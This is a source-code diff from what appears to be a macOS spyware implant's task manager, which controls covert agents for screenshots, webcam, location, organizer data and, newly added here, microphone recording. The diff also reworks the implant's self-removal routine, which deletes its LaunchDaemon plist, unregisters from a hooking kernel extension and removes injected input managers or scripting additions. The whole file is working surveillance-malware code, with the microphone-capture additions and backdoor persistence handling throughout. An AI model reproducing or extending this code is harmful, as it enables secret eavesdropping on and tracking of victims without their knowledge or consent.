@@ -16,8 +16,12 @@
 #import "RCSMAgentScreenshot.h"
 #import "RCSMAgentWebcam.h"
 #import "RCSMAgentOrganizer.h"
+
 #import "RCSMAgentPosition.h"
 #import "RCSMAgentDevice.h"
+
+#import "RCSMAgentMicrophone.h"
+
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -121,13 +125,13 @@ static NSLock *gSyncLock                  = nil;
               key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
               
               gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                                      size: SHMEM_COMMAND_MAX_SIZE
+                                                                      size: gMemCommandMaxSize
                                                              semaphoreName: SHMEM_SEM_NAME];
               [gSharedMemoryCommand createMemoryRegion];
               [gSharedMemoryCommand attachToMemoryRegion];
               
               gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                                      size: SHMEM_LOG_MAX_SIZE
+                                                                      size: gMemLogMaxSize
                                                              semaphoreName: SHMEM_SEM_NAME];
               [gSharedMemoryLogging createMemoryRegion];
               [gSharedMemoryLogging attachToMemoryRegion];
@@ -177,9 +181,7 @@ static NSLock *gSyncLock                  = nil;
       //
       // Start all the enabled agents
       //
-#ifndef NO_START_AT_LAUNCH
       [self startAgents];
-#endif
       
 #ifdef DEBUG_TASK_MANAGER
       infoLog(@"All Agents started");
@@ -188,24 +190,23 @@ static NSLock *gSyncLock                  = nil;
       //
       // Start events monitoring
       //
-      [self eventsMonitor];
-      /*
+      //[self eventsMonitor];
+      
       [NSThread detachNewThreadSelector: @selector(eventsMonitor)
                                toTarget: self
                              withObject: nil];
-      */
+      
     }
   else
     {
 #ifdef DEBUG_TASK_MANAGER
-      infoLog(@"An error occurred while loading the configuration file");
+      errorLog(@"An error occurred while loading the configuration file");
 #endif
 
       exit(-1);
     }
   
   [outerPool release];
-  
   return TRUE;
 }
 
@@ -353,214 +354,211 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
   if (lckRet == NO) 
     {
-      infoLog(@"%s: enter critical session with timeout [euid/uid %d/%d]", 
-              __FUNCTION__, geteuid(), getuid());
+      verboseLog(@"enter critical session with timeout [euid/uid %d/%d]", 
+                 geteuid(), getuid());
     }
   else
     {
-      infoLog(@"%s: enter critical session normaly [euid/uid %d/%d]", 
-              __FUNCTION__, geteuid(), getuid());
+      verboseLog(@"enter critical session normaly [euid/uid %d/%d]", 
+                 geteuid(), getuid());
     }
 #endif
 
-  /*if ([self stopEvents] == TRUE)
-  //if (1)
+  //
+  // Stop all events
+  //
+  //if ([self stopEvents] == NO)
+    //{
+//#ifdef DEBUG_TASK_MANAGER
+      //errorLog(@"Error while stopping events");
+//#endif
+    //}
+  //else
+    //{
+//#ifdef DEBUG_TASK_MANAGER
+      //infoLog(@"Events stopped correctly");
+//#endif
+    //}
+      
+  //
+  // Stop all agents
+  //
+  if ([self stopAgents] == NO)
     {
 #ifdef DEBUG_TASK_MANAGER
-      infoLog(@"Events stopped correctly");
+      errorLog(@"Error while stopping agents");
 #endif
-      
-      if ([self stopAgents] == TRUE)
-      //if (2)
-        {
+    }
+  else
+    {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agents stopped correctly");
-#endif*/
-          
-          /*
-          //
-          // Delete log files
-          //
-          NSString *encryptedLogExtension = [[mConfigManager encryption] 
-                                             scrambleForward: NEWCONF
-                                                        seed: gBackdoorSignature[0]];
-          
-          NSArray *logFiles = searchFile(encryptedLogExtension);
-          
-          for (NSString *logFile in logFiles)
-            {
+      infoLog(@"Agents stopped correctly");
+#endif
+    }
+
 #ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Removing log: %@", logFile);
-#endif
-              [[NSFileManager defaultManager] removeItemAtPath: logFile
-                                                         error: nil];
-            }
-          */
-          
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Uninstall called");
-          infoLog(@"Closing active logs");
-#endif
-          
-          RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
-          if ([_logManager closeActiveLogsAndContinueLogging: NO])
-            {
-#ifdef DEBUF
-              infoLog(@"Active logs closed correctly");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_TASK_MANAGER
-              errorLog(@"An error occurred while closing active logs");
-#endif
-            }
-          
-          //
-          // Remove the LaunchDaemon plist
-          //
-          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                                     [[[[[NSBundle mainBundle] bundlePath]
-                                        stringByDeletingLastPathComponent]
-                                       stringByDeletingLastPathComponent]
-                                      stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST ];
-          
-          [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
-                                                     error: nil];
-          
-          int kextFD  = open(BDOR_DEVICE, O_RDWR);
-          int ret     = 0;
-          int activeBackdoors = 1;
-          
-          // Show KEXT
-          //ret = ioctl(kextFD, MCHOOK_SHOWK);
-          
-          //
-          // Get the number of active backdoors since we won't remove the
-          // input manager if there's even one still registered
-          //
-          ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
-          
-          const char *userName = [NSUserName() UTF8String];
-          ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
-          
-          sleep(1);
-          
-          // Just ourselves
-          if (activeBackdoors == 1)
-            {
-              if (getuid() == 0 || geteuid() == 0)
-                {
-                  NSString *destDir = nil;
-                  
-                  if (gOSMajor == 10 && gOSMinor == 6) 
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"Removing scripting additions");
-#endif
-                      destDir = [[NSString alloc]
-                                    initWithFormat: @"/Library/ScriptingAdditions/%@",
-                                           OSAX_FOLDER ];
-                    }
-                  else if (gOSMajor == 10 && gOSMinor == 5) 
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"Removing input manager");
-#endif
-                      destDir = [[NSString alloc]
-                                           initWithFormat: @"/Library/InputManagers/%@",
-                                           INPUT_MANAGER_FOLDER ];
-                    }
-                
-                  NSError *err;
-                  
-                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                                  error: &err])
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"uid  = %d", getuid());
-                      infoLog(@"euid = %d\n", geteuid());
-                      infoLog(@"Error while removing the input manager");
-                      infoLog(@"error: %@", [err localizedDescription]);
-#endif
-                    }
-                  
-                  [destDir release];
-                }
-              else
-                {
-#ifdef DEBUG_TASK_MANAGER
-                  infoLog(@"I don't have privileges for removing the input manager :(");
-                  infoLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-#endif
-                }
-            }
-          else
-            {
-#ifdef DEBUG_TASK_MANAGER
-              warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
-#endif
-            }
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Removing SLI Plist just in case");
-#endif
-          [gUtil removeBackdoorFromSLIPlist];
-          
-          //
-          // Remove our working dir
-          //
-          if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
-                                                         error: nil])
-            {
-#ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Backdoor dir removed correctly");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_TASK_MANAGER
-              infoLog(@"An error occurred while removing backdoor dir");
-#endif
-            }
-          
-          [gSharedMemoryCommand detachFromMemoryRegion];
-          
-#ifdef DEMO_VERSION
-          changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
-#endif
-          
-          // Unregister uspace component
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Unregistering uspace components");
+  infoLog(@"Closing active logs");
 #endif
 
-          close(kextFD);
-          
-          //
-          // Unload our service from LaunchDaemon
-          //
-          NSArray *_commArguments = [[NSArray alloc] initWithObjects:
-                                     @"remove",
-                                     [[backdoorPlist lastPathComponent]
-                                      stringByDeletingPathExtension],
-                                     nil];
-          [gUtil executeTask: @"/bin/launchctl"
-                withArguments: _commArguments
-                 waitUntilEnd: YES];
-          
-          sleep(3);
-          //[gUtil release];
-        
-          [gSuidLock unlock];
-  
-#ifdef DEBUG_TASK_MANAGER
-    infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
-          __FUNCTION__, geteuid(), getuid());
+  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
+  if ([_logManager closeActiveLogsAndContinueLogging: NO])
+    {
+#ifdef DEBUF
+      infoLog(@"Active logs closed correctly");
 #endif
-          exit(0);
-        //}
-    //}
+    }
+  else
+    {
+#ifdef DEBUG_TASK_MANAGER
+      errorLog(@"An error occurred while closing active logs");
+#endif
+    }
+
+  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
+                             [[[[[NSBundle mainBundle] bundlePath]
+                                stringByDeletingLastPathComponent]
+                               stringByDeletingLastPathComponent]
+                              stringByDeletingLastPathComponent],
+                             BACKDOOR_DAEMON_PLIST];
+
+  //
+  // Remove the LaunchDaemon plist
+  //
+  [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
+                                             error: nil];
+
+  int activeBackdoors = 1;
+
+#ifndef NO_KEXT
+  int kextFD  = open(BDOR_DEVICE, O_RDWR);
+  int ret     = 0;
+
+  //
+  // Get the number of active backdoors since we won't remove the
+  // input manager if there's even one still registered
+  //
+  ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
+
+  //
+  // Unregister from kext
+  //
+  const char *userName = [NSUserName() UTF8String];
+  ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
+#endif
+
+  // Just ourselves
+  if (activeBackdoors == 1)
+    {
+      if (getuid() == 0 || geteuid() == 0)
+        {
+          NSString *destDir = nil;
+
+          if (gOSMajor == 10 && gOSMinor == 6) 
+            {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Removing scripting additions");
+#endif
+              destDir = [[NSString alloc]
+                initWithFormat: @"/Library/ScriptingAdditions/%@",
+                OSAX_FOLDER];
+            }
+          else if (gOSMajor == 10 && gOSMinor == 5) 
+            {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Removing input manager");
+#endif
+              destDir = [[NSString alloc]
+                initWithFormat: @"/Library/InputManagers/%@",
+                INPUT_MANAGER_FOLDER ];
+            }
+
+          NSError *err;
+
+          if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                          error: &err])
+            {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+              errorLog(@"Error while removing the input manager");
+              errorLog(@"error: %@", [err localizedDescription]);
+#endif
+            }
+
+          [destDir release];
+        }
+      else
+        {
+#ifdef DEBUG_TASK_MANAGER
+          errorLog(@"I don't have privileges for removing the input manager :(");
+          errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+#endif
+        }
+    }
+  else
+    {
+#ifdef DEBUG_TASK_MANAGER
+      warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
+#endif
+    }
+
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Removing SLI Plist just in case");
+#endif
+  [gUtil removeBackdoorFromSLIPlist];
+
+  //
+  // Remove our working dir
+  //
+  if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
+                                                 error: nil])
+    {
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Backdoor dir removed correctly");
+#endif
+    }
+  else
+    {
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"An error occurred while removing backdoor dir");
+#endif
+    }
+
+  [gSharedMemoryCommand detachFromMemoryRegion];
+
+#ifdef DEMO_VERSION
+  changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
+#endif
+
+  // Unregister uspace component
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Unregistering uspace components");
+#endif
+
+#ifndef NO_KEXT
+  close(kextFD);
+#endif
+
+  //
+  // Unload our service from LaunchDaemon
+  //
+  NSArray *_commArguments = [[NSArray alloc] initWithObjects:
+                             @"remove",
+                             [[backdoorPlist lastPathComponent]
+                              stringByDeletingPathExtension],
+                             nil];
+  [gUtil executeTask: @"/bin/launchctl"
+       withArguments: _commArguments
+        waitUntilEnd: YES];
+
+  sleep(3);
+  [gSuidLock unlock];
+
+#ifdef DEBUG_TASK_MANAGER
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+
+  exit(0);
 }
 
 #pragma mark -
@@ -619,7 +617,6 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
-#if 0
     case AGENT_ORGANIZER:
       {
 #ifdef DEBUG_TASK_MANAGER
@@ -646,7 +643,6 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
-#endif
     case AGENT_CAM:
       {   
 #ifdef DEBUG_TASK_MANAGER
@@ -1038,6 +1034,7 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+
       case AGENT_POSITION:
       {
 #ifdef DEBUG_TASK_MANAGER
@@ -1109,12 +1106,48 @@ static NSLock *gSyncLock                  = nil;
 #endif
           return FALSE;
         }
+      }
+    case AGENT_MICROPHONE:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Microphone");
+#endif
+        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if (agentConfiguration != nil)
+          {
+            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+              {
+                [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                [agentMic setAgentConfiguration: agentConfiguration];
+                
+                [NSThread detachNewThreadSelector: @selector(start)
+                                         toTarget: agentMic
+                                       withObject: nil];
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent Microphone is already running");
+#endif
+              }
+          }
+        else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent microphone not found");
+#endif
+
+            return FALSE;
+          }
         break;
       }
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
+        infoLog(@"Unsupported agent: 0x%04x", agentID);
 #endif
         
         return NO;
@@ -1177,7 +1210,6 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
-#if 0
     case AGENT_ORGANIZER:
       {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1201,7 +1233,6 @@ static NSLock *gSyncLock                  = nil;
 #endif
         break;
       }
-#endif
     case AGENT_CAM:
       {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1469,6 +1500,22 @@ static NSLock *gSyncLock                  = nil;
 #endif
           return NO;
         }
+        break;
+      }
+    case AGENT_MICROPHONE:
+      {
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent Microphone");
+#endif
+        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        
+        if ([agentMic stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Error while stopping agent Microphone");
+#endif
+            return NO;
+          }
         
         agentConfiguration = [self getConfigForAgent: agentID];
         [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
@@ -1499,7 +1546,7 @@ static NSLock *gSyncLock                  = nil;
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
+        errorLog(@"Unsupported agent: 0x%04x", agentID);
 #endif
         
         return NO;
@@ -1549,7 +1596,7 @@ static NSLock *gSyncLock                  = nil;
                   {
                     // Hard error atm, think about default config parameters
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Config not found");
+                    errorLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1565,7 +1612,6 @@ static NSLock *gSyncLock                  = nil;
                                 
                 break;
               }
-#if 0
             case AGENT_ORGANIZER:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -1584,7 +1630,6 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
-#endif
             case AGENT_CAM:
               {   
 #ifdef DEBUG_TASK_MANAGER
@@ -2010,6 +2055,35 @@ static NSLock *gSyncLock                  = nil;
                 }
                 break;
               }
+            case AGENT_MICROPHONE:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Microphone");
+#endif
+                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                
+                if ([agentConfiguration isKindOfClass: [NSString class]])
+                  {
+                    // Hard error atm, think about default config parameters
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Config not found");
+#endif
+                    break;
+                  }
+                else
+                  {
+                    [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                    [agentMic setAgentConfiguration: anObject];
+                         
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMic
+                                           withObject: nil];
+                  }
+                                
+                break;
+              }
             default:
               break;
             }
@@ -2072,7 +2146,6 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
-#if 0
             case AGENT_ORGANIZER:
               {
 #ifdef DEBUG_TASK_MANAGER        
@@ -2089,15 +2162,13 @@ static NSLock *gSyncLock                  = nil;
                   }
                 else
                   {
-                    agentConfiguration = [self getConfigForAgent: agentID];
-                    [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Organizer stopped correctly");
 #endif
                 break;
               }
-#endif
             case AGENT_CAM:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -2354,6 +2425,29 @@ static NSLock *gSyncLock                  = nil;
                 }
                 break;
               }
+            case AGENT_MICROPHONE:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Microphone");
+#endif
+                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                
+                if ([agentMic stop] == FALSE)
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Error while stopping agent Microphone");
+#endif
+                  }
+                else
+                  {
+                    [anObject setObject: AGENT_STOPPED
+                                 forKey: @"status"];
+                  }
+                
+                break;
+              }
+            default:
+              break;
             }
         }
       
@@ -2869,7 +2963,7 @@ static NSLock *gSyncLock                  = nil;
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
 {
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"getConfigForAgent called %x", anAgentID);
+  verboseLog(@"getConfigForAgent called %x", anAgentID);
 #endif
   
   NSMutableDictionary *anObject;
@@ -2884,14 +2978,14 @@ static NSLock *gSyncLock                  = nil;
            unsignedIntValue] == anAgentID)
         {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agent %d found", anAgentID);
+          verboseLog(@"Agent %d found", anAgentID);
 #endif
           return anObject;
         }
     }
   
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Agent %d not found", anAgentID);
+  verboseLog(@"Agent %d not found", anAgentID);
 #endif
 
   return nil;
